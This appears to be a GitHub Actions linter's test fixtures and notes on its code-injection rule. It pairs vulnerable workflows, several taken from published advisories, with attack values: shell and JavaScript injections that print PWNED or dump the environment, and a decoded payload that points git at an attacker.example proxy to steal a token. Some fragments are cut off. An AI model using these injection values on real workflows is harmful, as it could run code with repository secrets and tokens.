# attack-value: inputs.lycheeVersion = "$(printenv >> $GITHUB_STEP_SUMMARY && echo \"v0.16.1\")' ]]; echo PWNED; [[ '"
# attack-run-behavior: the value stands in five places of the script of
#   Download and extract lychee. The first test becomes if [[ '$(printenv >>
#   $GITHUB_STEP_SUMMARY && echo "v0.16.1")' ]]; echo PWNED; [[ '' =~
#   ^v0\.0|^v0\.1[0-5]\. ]]; then: the single quote ends the quoted string,
#   ]] ends the test, and bash runs echo PWNED as a command of the if's
#   condition, which prints PWNED; the last test is false, so the else
#   branch runs, and its tests for nightly and latest print PWNED the same
#   way. In the last else, the value is inside the double quotes of
#   DOWNLOAD_URL, where bash runs the advisory's command substitution,
#   printenv >> $GITHUB_STEP_SUMMARY, which writes the step's environment to
#   the job summary, and puts v0.16.1 in its place; the step then goes on to
#   curl and tar.
# advisory: https://github.com/advisories/GHSA-65rg-554r-9j5x
name: "Lychee Broken Link Checker"
description: "Quickly check links in Markdown, HTML, and text files"

inputs:
  args:
    description: "Lychee arguments (https://github.com/lycheeverse/lychee#commandline-parameters)"
    default: "--verbose --no-progress './**/*.md' './**/*.html' './**/*.rst'"
    required: false
  debug:
    description: "Enable debug output in action (set -x). Helpful for troubleshooting."
    default: false
    required: false
  fail:
    description: "Fail entire pipeline on error (i.e. when lychee exit code is not 0)"
    default: true
    required: false
  failIfEmpty:
    description: "Fail entire pipeline if no links were found"
    default: true
    required: false
  format:
    description: "Summary output format (e.g. json)"
    default: "markdown"
    required: false
  jobSummary:
    description: "Write GitHub job summary at the end of the job (written on Markdown output only)"
    default: true
    required: false
  lycheeVersion:
    description: "Use custom version of lychee link checker"
    default: v0.16.1
    required: false
  output:
    description: "Summary output file path"
    default: "lychee/out.md"
    required: false
  token:
    description: "Your GitHub Access Token, defaults to: {{ github.token }}"
    default: ${{ github.token }}
    required: false

outputs:
  exit_code:
    description: "The exit code returned from Lychee"
    value: ${{ steps.run-lychee.outputs.exit_code }}

runs:
  using: "composite"
  steps:
    - name: Set up environment
      run: |
        echo "$HOME/.local/bin" >> "$GITHUB_PATH"
        mkdir -p "$HOME/.local/bin"
      shell: bash

    - name: Clean up existing lychee files
      run: |
        # Remove any existing lychee binaries or archives to prevent conflicts
        rm -f "$HOME/.local/bin/lychee"
        rm -rf lychee
        rm -f "${{ steps.lychee-filename.outputs.filename }}"
      shell: bash

    - name: Download and extract lychee
      id: lychee-setup
      run: |
        # Determine filename and download URL based on version
        if [[ '${{ inputs.lycheeVersion }}' =~ ^v0\.0|^v0\.1[0-5]\. ]]; then
          FILENAME="lychee-${{ inputs.lycheeVersion }}-x86_64-unknown-linux-gnu.tar.gz"
          DOWNLOAD_URL="https://github.com/lycheeverse/lychee/releases/download/${{ inputs.lycheeVersion }}/${FILENAME}"
        else
          FILENAME="lychee-x86_64-unknown-linux-gnu.tar.gz"
          if [[ '${{ inputs.lycheeVersion }}' == 'nightly' ]]; then
            DOWNLOAD_URL="https://github.com/lycheeverse/lychee/releases/download/nightly/${FILENAME}"
          elif [[ '${{ inputs.lycheeVersion }}' == 'latest' ]]; then
            DOWNLOAD_URL="https://github.com/lycheeverse/lychee/releases/latest/download/${FILENAME}"
          else
            DOWNLOAD_URL="https://github.com/lycheeverse/lychee/releases/download/lychee-${{ inputs.lycheeVersion }}/${FILENAME}"
          fi
        fi

        echo "Downloading from: ${DOWNLOAD_URL}"
        curl -sfLO "${DOWNLOAD_URL}"

        echo "Extracting ${FILENAME}"
        tar -xvzf "${FILENAME}"

        # Output filename for use in later steps
        echo "filename=${FILENAME}" >> $GITHUB_OUTPUT
      shell: bash

    - name: Install lychee
      run: |
        install -t "$HOME/.local/bin" -D lychee
      shell: bash

    - name: Clean up installation files
      run: |
        # Remove the downloaded archive and any unnecessary files after installation
        rm -f "${{ steps.lychee-setup.outputs.filename }}"
        shopt -s extglob
        rm -f lychee!(*-bin|*-lib|*.toml)
      shell: bash

    - name: Run Lychee
      id: run-lychee
      run: |
        # This step runs lychee and captures its exit code.
        # We use 'set +e' to prevent the script from exiting immediately if lychee fails.
        # This allows us to capture the exit code and pass it both to GitHub Actions (via GITHUB_OUTPUT)
        # and to the shell (via the final 'exit $EXIT_CODE').
        # This ensures that:
        # 1. The step fails if lychee fails
        # 2. The exit code is available as an output for subsequent steps
        # 3. The exit code is properly propagated to the workflow
        set +e
        ${{ github.action_path }}/entrypoint.sh
        EXIT_CODE=$?
        echo "exit_code=$EXIT_CODE" >> $GITHUB_OUTPUT
        exit $EXIT_CODE
      env:
        # https://github.com/actions/runner/issues/665
        INPUT_TOKEN: ${{ inputs.TOKEN }}
        INPUT_ARGS: ${{ inputs.ARGS }}
        INPUT_DEBUG: ${{ inputs.DEBUG }}
        INPUT_FAIL: ${{ inputs.FAIL }}
        INPUT_FAILIFEMPTY: ${{ inputs.FAILIFEMPTY }}
        INPUT_FORMAT: ${{ inputs.FORMAT }}
        INPUT_JOBSUMMARY: ${{ inputs.JOBSUMMARY }}
        INPUT_OUTPUT: ${{ inputs.OUTPUT }}
      shell: bash

notes.reason: anyone who opens an issue writes its title, and ${{ }} puts it into the script of that step before bash parses it, so a single quote in it ends the quoted string of the [[ ]] test and what follows runs as commands. The first test becomes if [[ '$(printenv >> $GITHUB_STEP_SUMMARY && echo "v0.16.1")' ]]; echo PWNED; [[ '' =~ ^v0\.0|^v0\.1[0-5]\. ]]; then: the single quote ends the quoted string, ]] ends the test, and bash runs echo PWNED as a command of the if's condition, which prints PWNED; the last test is false, so the else branch runs, and its tests for nightly and latest print PWNED the same way. finding_kinds.detected: the script of the step (run:) passes the value of the variable {variable} to {code_reading}, and the value of the variable comes from {expr_ref}, which an attacker controls on {controlled_on}
finding_kinds.consequence: the value becomes code
finding_kinds.remedy: do not pass the variable to eval (eval "..."), to the code that a shell or an interpreter takes after -c (bash -c "...", python3 -c "..."), to the command name at the start of a command ($VAR arg), to the input of a shell (| bash) or to arithmetic ($(( ... )), [[ ... -eq ... ]]); pass the variable only as an argument of a command that reads the argument as data, such as printf '%s\n' "$VAR". Keep the variable inside double quotes there: without the quotes the value stays data, but bash splits the value into words and expands * and ?

metrics.reason: the attacker writes an issue, a comment or a pull request over the network
a command substitution or a command in the text, which the run reads as code through the variable, is all it takes
on a public repository anyone can open an issue or a pull request from a fork
nothing of the repository is needed
issues and comments trigger the workflow with nobody doing anything
the code reads the job's secrets and GITHUB_TOKEN
with the job's token the code can push, and write releases, artifacts and caches
the code can fail or stop the job
the secrets open what is past the job: clouds, registries, other repositories
what the job publishes (releases, packages) reaches those who use it
nothing past the job is made unavailable by this as such

no report was found of an attack through a variable of env that a run reads as code; a report by Radware of 2026-10 warns, among its mitigations, that a value moved into env can be passed to eval and become code again

fix_kinds.title: move the expressions into the env of the step, and read the variables where they were, quoted as the shell needs (bash and sh)

possible_side_effects.text: The value of the ${{ }} expression is no longer parsed by the program that reads the script (the shell, or the JavaScript runtime of actions/github-script) as part of the script text: characters of the value that the program interpreted before the fix (such as $, `, \, double quotes and line breaks) are taken as plain characters, and a workflow that relied on the program interpreting those characters runs differently.

fix_kinds.title: move the expressions into the env of the step and read them as "${NAME}" where they were unquoted (bash and sh), as $env:NAME (pwsh) or as process.env.NAME (github-script); take the line breaks out of what is written to $GITHUB_ENV or $GITHUB_OUTPUT, or make the delimiter of name<<DELIM random

possible_side_effects.text: An unquoted place becomes one word: a value with blanks is no longer read as several words, and outside [[ ]] is no longer globbed.
On the right of ==, =, != or =~ inside [[ ]], the value is compared as a string, not matched as a pattern or a regular expression.
The rule does not read the quoting of pwsh, so how $env:NAME is read at that place is not checked.
The rule does not read the JavaScript of github-script, so how process.env.NAME is read at that place is not checked.
The line breaks of a value written to $GITHUB_ENV or $GITHUB_OUTPUT are taken out, which changes a value that had them.
The random delimiter is made with od and /dev/urandom; in a container without them the step fails.

The value of the ${{ }} expression is no longer parsed by the program that reads the script (the shell, or the JavaScript runtime of actions/github-script) as part of the script text: characters of the value that the program interpreted before the fix (such as $, `, \, double quotes and line breaks) are taken as plain characters, and a workflow that relied on the program interpreting those characters runs differently.

undetected_forms.text: a value that an if compares with strings that the workflow writes in the if (strings compared by == with the value and joined by ||, or the strings of contains(fromJSON('[...]'), value)), where each string has only ASCII letters, digits, spaces, -, _, . and /, does not start with -, and has no - right after a space. The if of the job limits the value in every step of the job, and the if of a step with a run: script limits the value in that step only. In those steps the value equals one of the strings when the case of the letters is ignored, so the rule does not report the value. The attacker still chooses the case of each letter of the value. GitHub's server, which evaluates the if of a job, also takes the Kelvin sign as equal to the letter k and the long s as equal to the letter s; the runner, which evaluates the if of a step, takes the Kelvin sign as equal to the letter k. Where the case of a letter changes what the value names, such as a command, a variable, a file on a file system that tells names apart by their case (the default file system of a Linux runner), a host or a tool, the choice of the case can cause harm

examples.name: if-compared.yml
examples.text:
# situation: on issue_comment, a job runs only when the comment's body is
#   path, and the run: script of a step writes
#   ${{ github.event.comment.body }} as the name of a variable in an
#   assignment before a command (NAME=value command).
# reason: the job's if lets the body be only the string path, ignoring the
#   case of its letters, so the body has no character that the shell reads
#   as code; the attacker still chooses the case, and PATH is another
#   variable than path.
# cause: the rule does not treat a value that the if of the job compares
#   with such a string as written by the attacker.
# attack-value: github.event.comment.body = "PATH"
# attack-run-behavior: the if passes, and the script becomes
#   PATH=/tmp/tools ./build.sh, so the shell looks for the commands of
#   build.sh in /tmp/tools.
on:
  issue_comment:
    types: [created]
jobs:
  j:
    if: github.event.comment.body == 'path'
    runs-on: ubuntu-latest
    steps:
      - run: ${{ github.event.comment.body }}=/tmp/tools ./build.sh

undetected_forms.text: an expression in a value of env, whose variable a run of bash or sh reads only where the value stays data: inside double quotes, or outside quotes, as an argument of a command that reads the argument as data (echo "$TITLE"); in an assignment; in the body of a heredoc that a command reads as data; or no script reads the variable. bash expands the variable after bash parses the script, and the command reads the value as text. The rule reports the variable where bash, or a program, reads the value as code (code-injection.env-variable). This undetected form is only for a value that no command writes into a file that a later command or step runs as code; a value written into such a file is the undetected form written-file

examples.name: env-value.yml
examples.text:
# situation: on issues, the issue's title is in a value of env of a step of
#   actions/github-script and of a run, which read it as a variable.
# reason: no added gain: both steps read the variable as data, and nothing
#   reads the value again as code.
# cause: the rule reads a variable of env only where bash, or a program, reads
#   the value of the variable as code (code-injection.env-variable).
# attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
# attack-run-behavior: TITLE holds the value in both steps:
#   actions/github-script logs process.env.TITLE, and the run step's script
#   stays echo "$TITLE", which bash expands after it parses the script, so
#   echo prints the line "; echo PWNED; echo " as text.
on: issues
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: console.log(process.env.TITLE)
        env:
          TITLE: ${{ github.event.issue.title }}
      - run: echo "$TITLE"
        env:
          TITLE: ${{ github.event.issue.title }}

undetected_forms.text: a variable of env that a run of bash writes to the input of a coproc whose command runs the input of the coproc as code (coproc bash; echo "$TITLE" >&${COPROC[1]}), directly or through a descriptor number that the script copies or stores (exec 4>&${COPROC[1]}; echo "$TITLE" >&4, or fd=${COPROC[1]}; echo "$TITLE" >&$fd, or exec >&${COPROC[1]}; echo "$TITLE"): the rule does not read the input of a coproc as code for the value of a variable. For a ${{ }} written in a command whose redirect target holds an element of the coproc's array as a parameter (>&${COPROC[1]}), the rule gives no fix; for a ${{ }} written in a command that writes through a copied or stored descriptor number, or through arithmetic on the array ($((COPROC[1]))), the fix moves the value to env, and the injection stays after the fix in this form

examples.name: env-variable-coproc.yml
examples.text:
# situation: on an opened issue, a step passes the issue's title in the
#   environment variable ISSUE_TITLE, starts bash as a coproc, and writes
#   the variable to the coproc's input through a descriptor copied from the
#   coproc's array.
# reason: the coproc's bash runs what it reads from its input as code, and
#   the descriptor 4 is a copy of the coproc's input.
# cause: the rule does not read the input of a coproc as code for the value
#   of a variable, and does not follow a descriptor copied from the
#   coproc's array.
# attack-value: github.event.issue.title = "echo PWNED"
# attack-run-behavior: the coproc's bash runs echo PWNED, and cat prints
#   PWNED from the coproc's output through descriptor 5, a copy made before
#   the input is closed, because bash unsets the array when the coproc exits.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: |
          coproc bash
          exec 5<&"${COPROC[0]}"
          exec 4>&"${COPROC[1]}"
          echo "$ISSUE_TITLE" >&4
          exec 4>&- {COPROC[1]}>&-
          cat <&5

notes.reason: the coproc's bash runs what it reads from its input as code, and the descriptor 4 is a copy of the coproc's input.
notes.cause: the rule does not read the input of a coproc as code for the value of a variable, and does not follow a descriptor copied from the coproc's array.
notes.attack_run_behavior: the coproc's bash runs echo PWNED, and cat prints PWNED from the coproc's output through descriptor 5, a copy made before the input is closed, because bash unsets the array when the coproc exits.

#   whole script, so the rule reads m as an associative array and does not
#   read the subscript as arithmetic.
# attack-value: github.event.issue.title = "a[$(echo PWNED >/proc/$$/fd/1)]"
# attack-run-behavior: bash runs echo PWNED while bash reads the
#   subscript, and PWNED shows on the standard output.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest

      - env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: |
          f() { declare -A m; }
          m=(1)
          echo "${m[$ISSUE_TITLE]}"

notes.situation: on an opened issue, a step passes the issue's title in the environment variable ISSUE_TITLE, defines a function that declares m associative with declare -A, does not call the function, assigns an indexed array to m, and prints the element of m whose subscript is ISSUE_TITLE.
notes.reason: the function does not run, so m is an indexed array, and bash reads the subscript of an indexed array as arithmetic, which runs a command substitution in the value.
notes.cause: the rule reads the declare -A in the function as holding in the whole script, so the rule reads m as an associative array and does not read the subscript as arithmetic.
notes.attack_run_behavior: bash runs echo PWNED while bash reads the subscript, and PWNED shows on the standard output.

undetected_forms.text: an attacker's value that a program of the repository reads and then misuses, for example by installing a package whose name is in the value or by writing a file at a path that is in the value: the program is a local action that runs JavaScript or a Docker image (which reads an input or the event payload), or a program that a run starts (node submit.js, which reads a variable of env). The rule reads the scripts of runs and of actions/github-script, not the code of other programs

examples.name: repository-program.yml
examples.text:
# situation: on issues, a run starts node submitPr.js, a program of the
#   repository, with the body of the issue in the variable ISSUE_BODY of env
#   and a token that writes in GITHUB_TOKEN. This is the job publish of
#   submit.yml of dd-center/vdb (commit
#   06e81fc6aa74cb1c4bc3df9701c17c93f3a6991a, lines 1-4 and 45-64); the
#   triggers push and pull_request, the jobs close and pr, and the step Push
#   changes are left out. submitPr.js decodes commands from a block of the
#   body, writes a file at join('vtbs', <path>) with a content that the block
#   names, and then runs git push with the token in the URL of the remote.
#   plugin-prechecks.yml of homebridge/verified (commit
#   5674fc615f1f933322cfe6facb007caea366d59a, GHSL-2020-185) uses the local
#   action ./precheck, a node action whose input body takes
#   ${{ github.event.issue.body }} as its default; the JavaScript of the
#   action runs npm install with the name of a package that it reads from the
#   body, so the install scripts of the package run with the token of the
#   job.
# reason: a limitation (run time): what the program does with the value is in
#   the code of the program, and the run script only passes the value as data.
# cause: the rule reads the scripts of runs and of actions/github-script, not
#   the code of other programs.
# attack-value: github.event.issue.body = "-----BEGIN SUBMIT BLOCK-----cHV0OkxpNHZMbWRwZEM5amIyNW1hV2M9OlcyaDBkSEJkQ2dsd2NtOTRlU0E5SUdoMGRIQTZMeTloZEhSaFkydGxjaTVsZUdGdGNHeGxPamd3T0RBSw==-----END SUBMIT BLOCK-----"
# attack-run-behavior: the block decodes to put:<path>:<content>, where the
#   path is ../.git/config and the content is an [http] section with proxy =
#   http://attacker.example:8080. submitPr.js writes the content to
#   .git/config, and its git push sends the URL of the remote, which holds the
#   token in secrets.gtoken, through the proxy of the attacker. No run script
#   reads the value as code.
# advisory: https://securitylab.github.com/advisories/GHSL-2020-195-dd-center-vdb-workflow/
# advisory: https://securitylab.github.com/advisories/GHSL-2020-185-homebridge-verified-workflow/
name: Submit Branch
on:
  issues:
    types: [opened, reopened]
jobs:
  publish:
    if: github.event_name == 'issues'
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v1

    - name: Use Node.js 13
      uses: actions/setup-node@v1
      with:
        node-version: '13'

    - name: npm install
      run: npm install

    - name: Commit Branch
      run: node submitPr.js
      env:
        ISSUE_NUMBER: ${{ github.event.issue.number }}
        ISSUE_BODY: ${{ github.event.issue.body }}
        GITHUB_TOKEN: ${{ secrets.gtoken }}

notes.situation: on issues, a run starts node submitPr.js, a program of the repository, with the body of the issue in the variable ISSUE_BODY of env and a token that writes in GITHUB_TOKEN. This is the job publish of submit.yml of dd-center/vdb (commit 06e81fc6aa74cb1c4bc3df9701c17c93f3a6991a, lines 1-4 and 45-64); the triggers push and pull_request, the jobs close and pr, and the step Push changes are left out. submitPr.js decodes commands from a block of the body, writes a file at join('vtbs', <path>) with a content that the block names, and then runs git push with the token in the URL of the remote. plugin-prechecks.yml of homebridge/verified (commit 5674fc615f1f933322cfe6facb007caea366d59a, GHSL-2020-185) uses the local action ./precheck, a node action whose input body takes ${{ github.event.issue.body }} as its default; the JavaScript of the action runs npm install with the name of a package that it reads from the body, so the install scripts of the package run with the token of the job.
notes.reason: a limitation (run time): what the program does with the value is in the code of the program, and the run script only passes the value as data.
notes.cause: the rule reads the scripts of runs and of actions/github-script, not the code of other programs.
notes.attack_run_behavior: the block decodes to put:<path>:<content>, where the path is ../.git/config and the content is an [http] section with proxy = http://attacker.example:8080. submitPr.js writes the content to .git/config, and its git push sends the URL of the remote, which holds the token in secrets.gtoken, through the proxy of the attacker. No run script reads the value as code.

undetected_forms.text: a job that runs only on pull_request, in one of two cases. In the first case, only the pull requests of the repository run the workflow: the author of a pull request can change the workflow itself, so the run of the job gives the author what the run has (read-only from a fork, or what a private repository sends to the runs of pull requests from forks: secrets, a token that writes) without the flaw of the rule, and the flaw of the rule adds nothing to what the author gets. In the second case, a ruleset of the organization or the enterprise runs the workflow on the pull requests of its other repositories (Require workflows to pass before merging, of GitHub Enterprise): the author of such a pull request cannot change the workflow, and whether the run has more than the pull_request workflow of the author would get (the token, secrets) is known from GitHub's documentation only, as no such run was observed; making a required check pass is outside the threat model of the rule. The workflow does not say which case holds, and the rule does not read which case holds

undetected_forms.text: a value of the event of workflow_dispatch other than its inputs, in a job that runs only on workflow_dispatch: the event has the ref, which is a branch or a tag that the repository already has, and values that GitHub fills, such as the login of the account that dispatches the workflow; the event has no text of an issue, a comment or a pull request. Whoever dispatches the workflow chooses the ref and the inputs of the dispatch, and nothing else of the event. A token that cannot change the files of the repository can dispatch the workflow, such as a fine-grained token that has the permission Actions with write access and no permission Contents. The rule reports an input of the dispatch with the inconclusive kind input-dispatch

  j:

examples.text:
# situation: on workflow_run of a run from a pull request, a job downloads the
#   artifact pr-number of the triggering run, a step writes the content of
#   pr.txt to its output id, a later step writes that output into its run by
#   ${{ }}, and a step after it logs in to Azure with the secrets of the
#   repository. This is pr-website-deploy-comment.yml of microsoft/fluentui
#   (commit 18f41fc58e2a5280d9e5291063f6be7cc4d9c0eb, lines 1-6, 17-57); the
#   concurrency, the env, the outputs of the job, the download of the website
#   and the steps after the login are left out. adev-preview-deploy.yml of
#   angular/angular-ja (commit 8d2ac08bfae9f68b909bf7a57fb47977bc9450a3,
#   GHSL-2024-338) has the same form: it reads the number of the pull request
#   from __metadata__pull_number.txt of the artifact into the output value and
#   echoes the output in a run (line 50), and comment-on-pr.yml of sympy/sympy
#   (commit a1c630f8041c40a833e2a52e4aa533f6e6ff8b20, GHSL-2024-322) reads
#   pr_number.txt of the artifact into the output pr_number and echoes it in a
#   run (line 39).
#   preview-deploy.yml of ant-design/ant-design (commit
#   41fba82b39ff8664c63c173f1265f56891338fd5, GHSL-2024-121_GHSL-2024-122)
#   saves the number of the pull request from a file of the artifact to the
#   output id and writes it into a run (line 88).
# reason: the output is what the step reads from pr.txt, a file of the
#   artifact that the run of the pull request uploads, so the author of the
#   pull request writes it; the rule does not follow the output of a step back
#   to the file that the step reads.
# cause: the rule does not read what a run step writes to $GITHUB_OUTPUT from
#   a file.
# attack-value: steps.pr_number.outputs.id = "1$(echo${IFS}PWNED>/proc/$$/fd/1)"
# attack-run-behavior: the author of a pull request from a fork makes the run
#   of the pull request upload pr.txt with the value. The script of the step
#   Load WEBSITE URL becomes echo "id=…pull/1$(echo PWNED>/proc/$$/fd/1)/", and bash runs
#   the command substitution, which prints PWNED, with the token of the job;
#   the Azure login comes in the next step.
# advisory: https://securitylab.github.com/advisories/GHSL-2024-327_Microsoft_FluentUI/
# advisory: https://securitylab.github.com/advisories/GHSL-2024-338_Angular_JA/
# advisory: https://securitylab.github.com/advisories/GHSL-2024-322_Sympy/
# advisory: https://securitylab.github.com/advisories/GHSL-2024-121_GHSL-2024-122_ant-design/
on:
  workflow_run:
    workflows: ['PR Website Deploy']
    types:
      - completed
jobs:
  deploy:
    runs-on: ubuntu-latest
    if: ${{ github.event.workflow_run.event == 'pull_request' && github.event.workflow_run.conclusion == 'success' }}
    permissions:
      id-token: write
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: pr-number
          path: ./results
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - name: Load PR number
        id: pr_number
        run: echo "id=$(cat pr.txt)" >> $GITHUB_OUTPUT
        working-directory: ./results
      - name: Load WEBSITE URL
        id: website_url
        run: echo "id=https://fluentuipr.z22.web.core.windows.net/pull/${{steps.pr_number.outputs.id}}/" >> $GITHUB_OUTPUT
      - name: Login via Azure CLI
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

# situation: on workflow_run, the step get_pr_data asks the API for a pull
#   request, the step pr_meta writes the name of the head branch of the pull
#   request (.head.ref of the answer, read with jq) to $GITHUB_OUTPUT, and a
#   later step puts steps.pr_meta.outputs.head_ref into its script. These are
#   the steps of sonarcloud.yml of kptdev/kpt (commit
#   6dfff203a6b49396add815a428c1d94370e9a3d6, lines 69-97); the number of the
#   pull request, which the original reads from an artifact, is 1 in this
#   example. The example adds the last step, from lines 144-156 of the file,
#   which prints github.event.workflow_run.event, the name of the event of the
#   run that triggered the workflow, a value that an attacker does not decide.
#   vendor-gems.yml of Homebrew/brew (commit
#   fd69a7407574c63e3de8faf782b1b8d494ef827d, GHSL-2021-044) has the same
#   form: a run checks out the pull request with gh pr checkout, writes a part
#   of the name of the current branch to the output gem_name, and a later
#   step writes the output into its script (line 45).
# reason: whether the output head_ref holds a value of the attacker is decided
#   by what the script of the step pr_meta writes, which the rule does not
#   read.
# attack-value: the name of the head branch of the pull request of a fork = "x\";echo${IFS}PWNED;#"
# attack-run-behavior: jq writes the name to the output head_ref, the runner
#   puts the name into the script of the step "Debug - Show PR metadata", and
#   the line echo "Head Ref: x";echo${IFS}PWNED;#" prints PWNED.
# advisory: https://securitylab.github.com/advisories/GHSL-2026-207_kptdev_kpt_repository/
# advisory: https://securitylab.github.com/advisories/GHSL-2021-044-homebrew-brew-workflows/
on:
  workflow_run:
    workflows: [Go]
    types: [completed]
jobs:
  sonarqube:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read
    steps:
      - name: Request GitHub API for PR data
        uses: octokit/request-action@b91aabaa861c777dcdb14e2387e30eddf04619ae # v3.0.0
        id: get_pr_data
        with:
          route: GET /repos/{full_name}/pulls/{number}
          number: 1
          full_name: ${{ github.event.repository.full_name }}
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      - name: Extract PR metadata
        id: pr_meta
        env:
          PR_DATA: ${{ steps.get_pr_data.outputs.data }}
        run: |
          echo "head_ref=$(echo "$PR_DATA" | jq -r '.head.ref')" >> "$GITHUB_OUTPUT"
      - name: Debug - Show PR metadata
        run: |
          echo "Head Ref: ${{ steps.pr_meta.outputs.head_ref }}"
      - name: Debug - Check condition variables before SonarQube scan
        run: |
          echo "Event type: ${{ github.event.workflow_run.event }}"

examples.text:
# situation: on pull_request_target, two jobs write an output of an action of
#   another repository that lists the changed files into a run script by
#   ${{ }}, in the forms of two advisories. The job changed is the proof of
#   concept of GHSA-mcph-m25j-8j63: tj-actions/changed-files v40.2.3 (before
#   41) gives the changed files in its output all_changed_files, and a step
#   loops over the output (for file in ${{ … }}; do echo "$file was changed";
#   done). The job verify is the proof of concept of GHSA-ghm2-rq8q-wrhc:
#   tj-actions/verify-changed-files v16.1.1 (before 17) gives the changed files
#   in its output changed_files, and a step echoes the output.
# reason: the outputs are what the two actions set, and the action.yml of each
#   action is not among the files that the linter reads, so whether an attacker
#   controls an output is not known. Before the fixed versions, the two actions
#   escape only " in the names of the files (GHSA-mcph-m25j-8j63: "only escapes
#   \" for JSON values"), and the author of the pull request names the files
#   of the pull request.
# cause: the rule does not yet ask for the action.yml of another repository as
#   a fact, and does not read what an action does with the names of files.
# attack-value: steps.changed-files.outputs.all_changed_files = "$(echo${IFS}PWNED>/proc/$$/fd/1).txt"
# attack-run-behavior: the author of a pull request from a fork adds a file
#   named $(echo${IFS}PWNED>/proc/$$/fd/1).txt. The script of the step List
#   all changed files becomes for file in $(echo${IFS}PWNED>/proc/$$/fd/1).txt;
#   …, and bash runs the command substitution, which prints PWNED, with the
#   token of the job. In the job verify, the name goes into the script of the
#   echo the same way.
# advisory: https://github.com/advisories/GHSA-mcph-m25j-8j63
# advisory: https://github.com/advisories/GHSA-ghm2-rq8q-wrhc
on: pull_request_target
jobs:
  changed:
    runs-on: ubuntu-latest
    steps:
      - id: changed-files
        uses: tj-actions/changed-files@56284d80811fb5963a972b438f2870f175e5b7c8 # v40.2.3
      - name: List all changed files
        run: |
          for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
            echo "$file was changed"
          done
  verify:
    runs-on: ubuntu-latest
    steps:
      - id: verify-changed-files
        uses: tj-actions/verify-changed-files@54e20d3c522fbeed99ebaf2e38a1eb33214c58ba # v16.1.1
      - run: |

    workflows: ["Docs - Check for flaws in PX4 Guide Source"]
    types: [completed]
  pull_request_target:

        id: read-errors-by-page

# situation: a reusable workflow with no caller among the files that the
#   linter reads. The job terraform_plan runs terraform plan on the code of the
#   repository and sets its output plan_stdout from the step output stdout,
#   which the step writes from the output of terraform plan; the job
#   update_pr writes needs.terraform_plan.outputs.plan_stdout into the script
#   of actions/github-script, inside a JavaScript template string, by ${{ }}.
#   The jobs are .github/workflows/run-terraform.yml of
#   kartverket/github-workflows (commit
#   f1d9eac96bc37a19b81a465ef221f14195a8b974, the base of the fix
#   kartverket/github-workflows#19, lines 125-141, 188-211, 228-240 and
#   276-282); the inputs, the other steps, the escapes of the plan, the
#   comment that the script builds around the plan, the job terraform_check
#   (the job named update_pr here has needs: [terraform_check, terraform_plan])
#   and the if of the job (github.event_name == 'pull_request', line 221) are
#   left out, and the job update_github is named update_pr.
# reason: the value is what another job computes at run time, so whether an
#   attacker controls it is not known. The advisory says that "a malicious
#   actor could potentially send a PR with a malicious payload leading to
#   execution of arbitrary JavaScript code": the output of terraform plan
#   holds what the code of the pull request makes it print.
# cause: the rule does not yet follow the output of a job back to what sets
#   it, and does not read what terraform plan prints.
# attack-value: needs.terraform_plan.outputs.plan_stdout = "${require('child_process').execSync('echo PWNED')}"
# attack-run-behavior: when the plan prints the value, the script of the job
#   update_pr holds it inside a template string, and node.js runs the
#   JavaScript in ${ }, which starts echo PWNED, with the token of the job.
# advisory: https://github.com/advisories/GHSA-f9qj-7gh3-mhj4
on: workflow_call
jobs:
  terraform_plan:
    runs-on: ubuntu-latest
    outputs:
      plan_stdout: ${{ steps.plan.outputs.stdout }}
    steps:
      - uses: actions/checkout@v3
      - name: Terraform Plan
        id: plan
        run: |
          terraform plan -input=false -no-color -detailed-exitcode | tee output.txt
          STDOUT="$(sed '/^::/d' output.txt | grep -v 'Refreshing state...')"
          STDOUT="${STDOUT//'%'/'%25'}"
          STDOUT="${STDOUT//$'\n'/'%0A'}"
          STDOUT="${STDOUT//$'\r'/'%0D'}"
          echo "::set-output name=stdout::$STDOUT"
  update_pr:
    needs: terraform_plan
    runs-on: ubuntu-latest
    steps:
      - name: Update Pull Request
        uses: actions/github-script@v6
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const output = `#### Terraform Plan
            ${{ needs.terraform_plan.outputs.plan_stdout }}
            `;
            console.log(output);

on:

jobs:
  check-files:
    if: github.event_name == 'pull_request_target'

        env:

          gh pr view ${{ github.event.pull_request.number }} --json files -q ".files[].path" > changed_files.txt
